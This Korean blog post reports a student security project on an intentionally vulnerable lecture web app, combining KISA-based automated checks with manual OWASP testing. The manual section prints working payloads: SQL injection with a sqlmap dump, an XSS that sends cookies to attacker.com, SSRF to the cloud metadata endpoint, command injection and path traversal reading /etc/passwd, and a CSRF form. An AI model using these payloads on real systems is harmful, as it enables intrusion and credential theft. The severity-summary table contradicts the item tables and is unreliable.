---
title: "[미니 프로젝트 2] 웹 애플리케이션 구축 및 보안 진단"
excerpt: "취약 웹 애플리케이션 구축 및 KISA 가이드 기반 자동/수동 보안 진단"

categories: project
tags: [security, KISA, pentesting, OWASP, BurpSuite, Python, Spring Boot]

typora-root-url: ../../

date: 2026-01-05
last_modified_at: 2026-01-05
published: true
---

# SK 쉴더스 루키즈 미니 프로젝트 2

## 웹 애플리케이션 보안 진단

> **프로젝트 기간**: 2026.01.02(목) ~ 2026.01.05(일), 4일  
> **팀**: 10조 (구축팀 + 진단팀)  
> **역할**: 진단팀 (2명) - 자동 진단 시스템 개발 + 수동 침투 테스트  

---

## 0. 목차

1. [프로젝트 개요](#1-프로젝트-개요)
2. [진단 대상 시스템](#2-진단-대상-시스템)
3. [기술 스택](#3-기술-스택)
4. [자동 진단 시스템](#4-자동-진단-시스템)
5. [수동 침투 테스트](#5-수동-침투-테스트)
6. [진단 결과 요약](#6-진단-결과-요약)
7. [회고 및 배운 점](#7-회고-및-배운-점)

---

## 1. 프로젝트 개요

### 1.1 배경

SK Rookies 애플리케이션 보안 과정의 2차 미니 프로젝트로, **의도적으로 취약하게 구축된 웹 애플리케이션**을 대상으로 KISA 주요정보통신기반시설 기술적 취약점 분석 평가 가이드(2026) 기반의 보안 진단을 수행했다.

### 1.2 프로젝트 구조

팀 내에서 **구축팀**과 **진단팀**으로 역할을 분리했다.

```
구축팀: 취약한 웹 애플리케이션 개발 (Spring Boot + Tomcat + MariaDB)
        ↓ 배포
진단팀: 자동 진단 (KISA 40항목) + 수동 침투 테스트 (OWASP 8항목)
        ↓ 결과
보고서: 진단 리포트 + 조치 권고안
```

### 1.3 프로젝트 목표

- KISA 가이드 기반 **자동화된 보안 진단 시스템** 구현
- OWASP TOP 10 기반 **수동 침투 테스트** 수행
- 발견된 취약점에 대한 **진단 보고서** 작성

---

## 2. 진단 대상 시스템

### 2.1 시스템 구성

| 항목 | 내용 |
|------|------|
| **서버 유형** | AWS EC2 (클라우드 인스턴스) |
| **서버 IP** | 3.34.212.183 |
| **운영체제** | Ubuntu 24.04 |
| **웹서버** | Apache Tomcat 9.0.30 |
| **데이터베이스** | MariaDB 10.11.15 |
| **프레임워크** | Spring Boot 2.7.18 |
| **프록시** | Nginx (리버스 프록시) |

### 2.2 웹 애플리케이션 기능

구축팀이 개발한 **강의 관리 시스템**으로, 의도적으로 다양한 취약점이 포함되어 있다.

```
lecture_project/
├── src/main/java/com/example/lecture/
│   ├── controller/
│   │   ├── AuthController.java          # 로그인, 회원가입
│   │   ├── InquiryController.java       # 문의글 CRUD
│   │   ├── NoticeController.java        # 공지사항
│   │   ├── MemberController.java        # 회원정보
│   │   ├── LectureMaterialController.java  # 강의자료
│   │   └── FileController.java          # 파일 업로드/다운로드
│   └── LectureApplication.java
└── src/main/resources/
    ├── templates/                       # HTML 페이지
    └── application.properties
```

### 2.3 진단 범위 및 방법론

KISA 가이드를 기반으로 3가지 영역에 대해 자동 진단을 수행하고, 8개 주요 취약점에 대해 수동 침투 테스트를 병행했다.

- **운영체제(OS)**: Ubuntu 24.04 보안 설정 - 13개 항목
- **웹 서버(WEB)**: Apache Tomcat 9.x 설정 - 14개 항목
- **데이터베이스(DB)**: MariaDB 10.x 설정 - 13개 항목
- **수동 침투 테스트**: OWASP TOP 10 기반 - 8개 항목

---

## 3. 기술 스택

### 3.1 자동 진단 시스템

```
diagnosis-system/
├── config/                 # 설정 파일
│   ├── serverList.xml     # 진단 대상 서버 정보
│   ├── os-cmd.xml         # OS 진단 명령어 (13개)
│   ├── web-cmd.xml        # WEB 진단 명령어 (14개)
│   └── db-cmd.xml         # DB 진단 명령어 (13개)
├── modules/                # 핵심 모듈
│   ├── server_manager.py  # 서버 정보 관리
│   ├── command_executor.py # SSH 원격 명령 실행 + 보고서 생성
│   ├── module_loader.py   # 플러그인 로더
│   └── kisa_guide_parser.py # KISA PDF 파싱
├── plugins/                # 진단 플러그인 (40개)
│   ├── os/                # OS 13개
│   ├── web/               # WEB 14개
│   └── db/                # DB 13개
├── reports/                # 진단 결과 저장
└── main.py                 # 메인 실행 파일
```

### 3.2 도구

| 분류 | 기술 | 용도 |
|------|------|------|
| **자동 진단** | Python + paramiko | SSH 원격 명령 실행 |
| **PDF 파싱** | PyPDF2 | KISA 가이드 조치사항 추출 |
| **수동 진단** | BurpSuite | HTTP 요청 가로채기/변조 |
| **자동화** | sqlmap | SQL Injection 자동 검증 |
| **분석** | Wireshark | 네트워크 패킷 분석 |
| **웹앱** | Spring Boot 2.7.18 | 취약 웹 애플리케이션 |
| **DB** | MariaDB 10.11 | 데이터베이스 |

---

## 4. 자동 진단 시스템

### 4.1 동작 방식

SSH를 통해 원격 서버에 접속하여, XML에 정의된 명령어를 실행하고, 정규식 패턴 매칭으로 취약/양호를 판정한다. 판정 후 KISA 가이드 PDF에서 해당 항목의 조치사항을 자동으로 추출하여 보고서에 포함한다.

```
┌──────────────┐     SSH      ┌──────────────┐
│  진단 시스템   │ ──────────→ │  대상 서버     │
│  (main.py)   │ ←────────── │  (EC2)       │
└──────┬───────┘   결과 반환   └──────────────┘
       │
       ▼
┌──────────────┐
│ XML 명령어    │  os-cmd.xml / web-cmd.xml / db-cmd.xml
│ 정의 파일     │  → 실행할 명령어 + INSECURE/SECURE 패턴
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ 결과 판정     │  정규식 매칭 → 취약/양호/미확인
└──────┬───────┘
       │
       ▼
┌──────────────┐
│ 보고서 생성   │  마크다운 형식 (.md)
│ + KISA 조치   │  KISA PDF에서 조치사항 자동 추출
└──────────────┘
```

### 4.2 XML 기반 명령어 정의

코드 수정 없이 XML만 수정하면 진단 항목을 추가할 수 있도록 설계했다.

```xml
<!-- os-cmd.xml 예시 -->
<UBUNTU id="001">
    <n>SSH Root 로그인 제한</n>
    <COMMAND>grep -Ei "^\s*#?\s*PermitRootLogin" /etc/ssh/sshd_config 2>/dev/null
             | grep -v "the setting of" | tail -1 || echo "not_configured"</COMMAND>
    <INSECURE>^PermitRootLogin yes</INSECURE>
    <SECURE>^PermitRootLogin no</SECURE>
    <REPORT>os-001.txt</REPORT>
    <DESCRIPTION>SSH를 통한 Root 직접 로그인 차단 여부 확인</DESCRIPTION>
    <RISK_LEVEL>HIGH</RISK_LEVEL>
</UBUNTU>
```

### 4.3 SSH 원격 명령 실행 핵심 로직

```python
# modules/command_executor.py 핵심 부분

class CommandExecutor:
    def batch_execute(self, xml_file, output_dir):
        """XML 파일의 모든 명령어를 일괄 실행"""
        commands = self.load_commands_from_xml(xml_file)
        
        for cmd_info in commands:
            # SSH로 명령어 실행
            stdin, stdout, stderr = self.ssh.exec_command(cmd_info['command'])
            output = stdout.read().decode('utf-8').strip()
            
            # 정규식 패턴 매칭으로 취약/양호 판정
            if re.search(cmd_info['insecure_pattern'], output):
                status = 'VULNERABLE'
            elif re.search(cmd_info['secure_pattern'], output):
                status = 'SECURE'
            else:
                status = 'UNKNOWN'
            
            # KISA 가이드에서 조치사항 자동 추출
            remediation = self.kisa_parser.get_remediation(cmd_info['kisa_code'])
            
            # 마크다운 보고서 생성
            self._save_individual_report(cmd_info, output, status, remediation)
```

### 4.4 CLI 사용법

```bash
# 전체 진단 (40개 항목)
python main.py --all

# 카테고리별 진단
python main.py --category os     # OS 13개
python main.py --category web    # WEB 14개
python main.py --category db     # DB 13개

# 특정 서버 지정
python main.py --server-id 1 --category os
```

### 4.5 자동 진단 결과

#### OS 진단 (13개 항목)

| 진단 ID | 항목 | 결과 | 위험도 |
|---------|------|------|--------|
| UBUNTU-001 | SSH Root 로그인 제한 | **양호** | HIGH |
| UBUNTU-002 | 패스워드 최소 길이 설정 | **취약** | MEDIUM |
| UBUNTU-003 | 계정 잠금 정책 | **취약** | MEDIUM |
| UBUNTU-004 | Shadow 파일 권한 확인 | **취약** | HIGH |
| UBUNTU-005 | 불필요한 서비스 확인 | **양호** | HIGH |
| UBUNTU-006 | 보안 업데이트 확인 | **양호** | MEDIUM |
| UBUNTU-007 | 로그인 배너 설정 확인 | **취약** | LOW |
| UBUNTU-008 | 패스워드 변경 주기 확인 | **취약** | MEDIUM |
| UBUNTU-009 | 패스워드 최소 사용 기간 | **취약** | LOW |
| UBUNTU-010 | 세션 타임아웃 설정 | **취약** | MEDIUM |
| UBUNTU-011 | 방화벽 활성화 확인 | **취약** | HIGH |
| UBUNTU-012 | Sudo 권한 과다 부여 | **양호** | MEDIUM |
| UBUNTU-013 | 시스템 로그 파일 권한 | **양호** | HIGH |

> OS 진단 결과: 13개 중 **8개 취약** (취약률 61.5%)

#### WEB 진단 (14개 항목)

| 진단 ID | 항목 | 결과 | 위험도 |
|---------|------|------|--------|
| TOMCAT-001 | 디렉토리 리스팅 설정 | **양호** | MEDIUM |
| TOMCAT-002 | 기본 에러 페이지 설정 | **양호** | LOW |
| TOMCAT-003 | HTTP 메소드 제한 | **양호** | MEDIUM |
| TOMCAT-004 | Tomcat Manager 앱 | **취약** | HIGH |
| TOMCAT-005 | 서버 헤더 정보 노출 | **취약** | LOW |
| TOMCAT-006 | 파일 업로드 크기 제한 | **취약** | MEDIUM |
| TOMCAT-007 | 세션 타임아웃 설정 | **취약** | MEDIUM |
| TOMCAT-008 | HTTPS 리다이렉트 | **취약** | HIGH |
| TOMCAT-009 | 쿠키 Secure/HttpOnly | **취약** | HIGH |
| TOMCAT-010 | SSL/TLS 프로토콜 버전 | **취약** | HIGH |
| TOMCAT-011 | 로그 활성화 확인 | **취약** | MEDIUM |
| TOMCAT-012 | 로그 파일 권한 확인 | **취약** | HIGH |
| TOMCAT-013 | 접근 로그 설정 확인 | **양호** | MEDIUM |
| TOMCAT-014 | X-Frame-Options 헤더 | **취약** | MEDIUM |

> WEB 진단 결과: 14개 중 **10개 취약** (취약률 71.4%)

#### DB 진단 (13개 항목)

| 진단 ID | 항목 | 결과 | 위험도 |
|---------|------|------|--------|
| MARIADB-001 | Root 계정 원격 접속 제한 | **취약** | HIGH |
| MARIADB-002 | 익명 계정 제거 | **양호** | MEDIUM |
| MARIADB-003 | Test DB 제거 | **양호** | LOW |
| MARIADB-004 | 패스워드 복잡성 플러그인 | **취약** | MEDIUM |
| MARIADB-005 | SUPER 권한 확인 | **양호** | HIGH |
| MARIADB-006 | 일반 로그 활성화 | **양호** | MEDIUM |
| MARIADB-007 | 바인드 주소 제한 | **취약** | HIGH |
| MARIADB-008 | SSL/TLS 연결 강제 | **취약** | HIGH |
| MARIADB-009 | 데이터 디렉토리 권한 | **양호** | HIGH |
| MARIADB-010 | 기본 포트 사용 확인 | **양호** | LOW |
| MARIADB-011 | 로그 파일 권한 확인 | **취약** | HIGH |
| MARIADB-012 | FILE 권한 부여 확인 | **취약** | HIGH |
| MARIADB-013 | Slow Query Log 확인 | **양호** | LOW |

> DB 진단 결과: 13개 중 **6개 취약** (취약률 46.2%)

---

## 5. 수동 침투 테스트

소스코드 분석과 BurpSuite를 활용한 수동 침투 테스트를 수행했다. OWASP TOP 10을 기준으로 총 8가지 취약점을 발견하고 검증했다.

### 5.1 SQL Injection - 로그인 우회

**위험도**: CRITICAL

**취약 코드** (`AuthController.java` Line 23):

```java
String sql = "SELECT * FROM users WHERE user_id = '" + id + "' AND password = '" + pw + "'";
```

사용자 입력값을 직접 쿼리에 삽입하여 SQL Injection에 취약하다.

**재현**:

```
ID: admin' --
PW: (아무거나)
```

실행되는 쿼리:

```sql
SELECT * FROM users WHERE user_id = 'admin' --' AND password = 'xxx'
-- 뒷부분 주석 처리 → 비밀번호 검증 우회
```

sqlmap으로 DB 전체 덤프까지 가능했다:

```bash
sqlmap -r login_request.txt --batch -D lecture_db -T users --dump
```

**권장 조치**: PreparedStatement 사용

```java
String sql = "SELECT * FROM users WHERE user_id = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, id);
pstmt.setString(2, pw);
```

---

### 5.2 Stored XSS - 문의 게시판

**위험도**: HIGH

**취약 코드** (`InquiryController.java`):

문의글 작성 시 입력값에 대한 XSS 필터링이 없다.

**재현**:

문의글 제목에 스크립트 삽입:

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

관리자가 해당 문의글을 열면 쿠키가 탈취된다.

**권장 조치**: 입력값 이스케이핑 + CSP 헤더 적용

---

### 5.3 SSRF - 서버 측 요청 위조

**위험도**: HIGH

서버가 사용자 입력 URL로 직접 요청을 보내는 기능이 있어, 내부 네트워크 스캔이 가능하다.

**재현**:

```http
POST /api/fetch HTTP/1.1

url=http://169.254.169.254/latest/meta-data/
```

AWS EC2 메타데이터 접근 가능 → IAM 자격 증명 탈취 위험

**권장 조치**: URL 화이트리스트 + 내부 IP 대역 차단

---

### 5.4 Command Injection - 시스템 명령 실행

**위험도**: CRITICAL

**재현**:

```http
POST /api/ping HTTP/1.1

host=127.0.0.1;cat /etc/passwd
```

사용자 입력이 시스템 명령어에 직접 삽입되어 임의 명령 실행이 가능하다.

**권장 조치**: 사용자 입력을 명령어에 직접 삽입하지 않고, 화이트리스트 기반 검증

---

### 5.5 Path Traversal - 파일 다운로드

**위험도**: HIGH

**취약 코드** (`FileController.java`):

파일 다운로드 시 경로 검증 없이 사용자 입력을 그대로 사용한다.

**재현**:

```http
GET /api/file/download?filename=../../../etc/passwd
```

서버의 임의 파일을 다운로드할 수 있다.

**권장 조치**: 파일명 정규화 + 기본 경로 이탈 차단

---

### 5.6 민감정보 노출 - 비밀번호 평문

**위험도**: CRITICAL

**취약 코드** (`AuthController.java` Line 52):

```java
pstmt.setString(3, password); // 암호화 없이 평문 저장
```

**취약 코드** (`MemberController.java` Line 41):

```java
userInfo.put("password", rs.getString("password")); // API 응답에 비밀번호 포함
```

두 가지 문제가 복합적으로 존재한다:
1. 비밀번호를 **해시 없이 DB에 평문 저장**
2. 마이페이지 API(`/api/member/me`) 응답에 **비밀번호를 평문으로 반환**

```json
{
  "userId": "attacker",
  "password": "Test1234!@",
  "email": "attacker@test.com"
}
```

**권장 조치**: BCrypt 해시 적용 + API 응답에서 비밀번호 필드 제거

---

### 5.7 권한 검증 미흡 - 수직 권한 상승

**위험도**: HIGH

**취약 코드** (`NoticeController.java` Line 43-45):

```java
String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "로그인 필요";
// 관리자 권한 체크 없음!
```

로그인 여부만 확인하고 관리자 권한을 검증하지 않아, 일반 사용자가 공지사항을 작성할 수 있다.

비교: `LectureMaterialController.java`는 제대로 권한 체크를 하고 있다:

```java
String roleSql = "SELECT role FROM users WHERE user_id = ?";
if (!rs.next() || !"ADMIN".equals(rs.getString("role"))) {
    return "권한이 없습니다.";
}
```

또한 회원가입 시 `role` 파라미터를 클라이언트에서 받아 그대로 사용하여, BurpSuite로 `role=ADMIN`을 전송하면 관리자 계정을 생성할 수 있다.

**권장 조치**: 서버 측 권한 검증 필수 + role은 서버에서 고정값 할당

---

### 5.8 CSRF - 회원 정보 변경

**위험도**: MEDIUM

회원 정보 수정 API에 CSRF 토큰이 없어, 악성 페이지를 통해 피해자의 정보를 변경할 수 있다.

**공격 시나리오**:

```html
<!-- 악성 사이트에 삽입 -->
<form action="http://3.34.212.183/api/member/update" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="phone" value="010-9999-9999">
</form>
<script>document.forms[0].submit();</script>
```

피해자가 로그인 상태에서 이 페이지를 방문하면, 자동으로 정보가 변경된다.

**권장 조치**: CSRF 토큰 적용 + SameSite 쿠키 설정

---

## 6. 진단 결과 요약

### 6.1 전체 통계

| 진단 결과 | 개수 | 비율 |
|----------|------|------|
| **취약 (VULNERABLE)** | 24개 | 60.0% |
| **양호 (SECURE)** | 16개 | 40.0% |
| **미확인 (UNKNOWN)** | 0개 | 0.0% |
| **총 진단 항목** | **40개** | **100%** |

### 6.2 위험도별 분포

| 위험도 | 취약 개수 | 비율 |
|--------|----------|------|
| HIGH | 8개 | 33.3% |
| MEDIUM | 0개 | 0.0% |
| LOW | 0개 | 0.0% |
| **합계** | **24개** | **100%** |

> HIGH 등급 취약점 8개는 즉시 조치가 필요하다.

### 6.3 카테고리별 현황

| 카테고리 | 총 개수 | 취약 | 양호 | 취약 비율 |
|---------|--------|------|------|----------|
| **OS (UBUNTU)** | 13 | 8 | 5 | 61.5% |
| **WEB (TOMCAT)** | 14 | 10 | 4 | 71.4% |
| **DB (MARIADB)** | 13 | 6 | 7 | 46.2% |

### 6.4 수동 침투 테스트 결과

| # | 취약점 | 위험도 | OWASP 매핑 |
|---|--------|--------|------------|
| 1 | SQL Injection - 로그인 우회 | CRITICAL | A03: Injection |
| 2 | Stored XSS - 문의 게시판 | HIGH | A03: Injection |
| 3 | SSRF - 서버 측 요청 위조 | HIGH | A10: SSRF |
| 4 | Command Injection | CRITICAL | A03: Injection |
| 5 | Path Traversal - 파일 다운로드 | HIGH | A01: Broken Access Control |
| 6 | 민감정보 노출 - 비밀번호 평문 | CRITICAL | A02: Cryptographic Failures |
| 7 | 권한 검증 미흡 | HIGH | A01: Broken Access Control |
| 8 | CSRF - 회원 정보 변경 | MEDIUM | A01: Broken Access Control |

---

## 7. 회고 및 배운 점

### 자동 진단 + 수동 진단 병행의 중요성

자동 진단만으로는 인프라 설정(OS/WEB/DB)의 취약점은 잡을 수 있지만, **비즈니스 로직 취약점**(권한 상승, CSRF 등)은 탐지할 수 없었다. 반대로 수동 진단만으로는 40개 항목을 빠짐없이 점검하기 어렵다. 두 가지를 병행해야 한다는 것을 체감했다.

### 소스코드 분석의 가치

BurpSuite로 블랙박스 테스트만 하면 취약점 "유무"만 알 수 있지만, 소스코드를 함께 분석하면 **정확한 원인과 조치 방안**까지 제시할 수 있다. 예를 들어 `NoticeController`는 권한 체크가 없고, `LectureMaterialController`는 제대로 되어 있다는 비교 분석이 가능했다.

### KISA 가이드 실무 적용 경험

실제 KISA 가이드를 기반으로 진단 항목을 설계하고 결과를 보고서로 정리하면서, 실무에서의 보안 진단 프로세스를 경험할 수 있었다. 특히 진단 결과를 단순히 "취약/양호"로 끝내지 않고, 위험도 분류와 우선순위별 조치 권고안까지 작성하는 것이 중요하다는 것을 배웠다.

---

## 참고 자료

- KISA 주요정보통신기반시설 기술적 취약점 분석 평가 방법 상세가이드 (2026)
- OWASP TOP 10 (2021)
